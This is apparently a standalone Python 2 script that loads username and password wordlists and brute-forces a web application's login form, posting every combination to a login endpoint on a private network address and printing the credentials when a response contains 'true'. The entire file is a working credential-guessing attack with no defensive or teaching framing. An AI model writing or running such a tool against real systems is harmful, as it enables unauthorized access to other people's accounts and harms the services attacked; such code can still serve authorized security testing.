#encoding:utf-8
import io
import requests
import re
import time


passlist = []
with open("password.txt") as f:
    for x in f.readlines():
        passlist.append(x.strip())
f.close()
userlist = []
with open("username.txt") as f:
    for x in f.readlines():
        userlist.append(x.strip())
f.close()

def BruteCheck():
    count = 0
    print "Start BruteForce-----------------------------"
    for x in userlist:
        for y in passlist:
            payload={'txtname':str(x),'txtpassword':str(y)}
            res = requests.post("http://192.168.10.203:8099/User/SubLogin",data=payload)
            time.sleep(0.2)
            count+=1
            if re.findall("true",res.text):#if not re.findall("alert",res.text):
                print "在第%d次尝试成功" %count
                print '[+]The username is: '+x +',the password is: ' + y
                return
    print "[-]pass not found"
BruteCheck()

